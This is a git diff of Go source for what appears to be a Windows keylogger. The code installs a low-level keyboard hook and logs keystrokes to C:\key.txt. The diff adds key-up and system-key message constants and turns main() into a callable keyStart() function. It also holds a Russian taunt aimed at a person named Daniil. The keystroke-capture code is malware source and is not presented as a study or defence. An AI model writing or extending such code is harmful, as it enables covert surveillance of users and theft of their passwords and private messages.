@@ -16,7 +16,10 @@ import (
 
 const (
 	whKeyboardLl        = 13
-	wmKeydown           = 256
+	wmKeydown           = 256 //0x0100
+	wmKeyUp             = 257 //0x0101
+	wmSysKeyDown        = 260 //0x0104
+	wmSysKeyUp          = 261 //0x0105
 	mapvkToVcs          = 0
 	fileName            = "store.d.compile"
 	keyMessage   string = "Аниме - сила, Даниил - могила!!! "
@@ -39,11 +42,6 @@ var (
 
 // HOOKPROC ...
 type HOOKPROC func(int, uintptr, uintptr) uintptr
-
-// POINT ...
-type POINT struct {
-	X, Y int32
-}
 
 // MSG ...
 type MSG struct {
@@ -182,7 +180,8 @@ func Start() {
 	UnhookWindowsHookEx(keyboardHook)
 }
 
-func main() {
+//run in main()
+func keyStart() {
 	// Set Log output to a file
 	filename := fmt.Sprintf("C:\\key.txt")
 	logFile, err := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE, 0755)
